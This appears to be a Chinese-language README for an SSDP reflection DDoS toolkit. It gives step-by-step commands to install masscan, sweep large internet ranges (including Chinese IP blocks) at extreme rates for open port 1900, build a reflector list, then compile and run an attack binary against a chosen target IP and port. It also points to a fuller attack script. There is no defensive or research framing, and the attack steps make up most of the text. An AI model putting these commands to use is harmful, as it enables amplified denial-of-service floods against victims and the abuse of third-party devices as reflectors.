# Ddos Ssdp Attack
> Use Masscan Scan Server

### 安装环境
	yum install git make screen gcc libpcap-dev

### 安装 Masscan
	git clone https://github.com/robertdavidgraham/masscan
	cd masscan
	make && make install

### 扫描 Server
	# 最高速扫描全网 SSDP 端口保存为 JSON
	screen masscan 0.0.0.0/4 -p1900 --rate 100000000 -oJ ip.json
	# 转换格式为单 IP 的 TXT
	python format.py ip.json ip.txt

> **扫描中国IP段方式**<br>
> screen masscan -iL ip/cn_ip.txt -p1900 --rate 100000000 -oJ ip.json

### 攻击 SSDP
	# 编译攻击脚本
	gcc -pthread ssdp.c -o ssdp
	# SSDP 攻击
	./ssdp <target IP> <target port> <reflection file> <time (optional)>

> 攻击或使用功能更全的 saddam.py 攻击脚本<br>

### 报错 libpcap
	# 从官网下载最新的 http://www.tcpdump.org/release/
	# 或直接用 http://www.tcpdump.org/release/libpcap-1.9.1.tar.gz
	wget -c http://www.tcpdump.org/release/libpcap-1.9.1.tar.gz
	tar zxf libpcap-1.9.1.tar.gz
	cd libpcap-1.9.1
	make && make install
	ls /usr/local/lib
	# 发现已经有了libpcap的so了
	vim /etc/ld.so.conf
	# 追加一行
	/usr/local/lib
	# 使用如下命令刷新
	ldconfig
